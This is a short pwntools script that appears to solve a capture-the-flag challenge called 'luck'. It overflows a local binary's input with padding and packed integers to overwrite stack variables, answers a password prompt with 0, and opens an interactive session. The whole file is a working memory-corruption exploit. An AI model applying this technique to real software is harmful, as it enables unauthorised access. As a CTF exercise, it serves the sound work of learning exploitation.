from pwn import *

r = process('luck')
print r.recvline()
print r.recvline()


v6 = p32(-87117812, sign='signed')	
v7 = p32(-559038737, sign='signed')	
v8 = p32(0, sign='signed')	

payload = 'a' * 12 + v6 + v7 + v8
r.send(payload)
print r.recvline()
print r.recvline()
print r.recvline('password:')

v4 = str(0)
r.sendline(v4)
r.interactive()
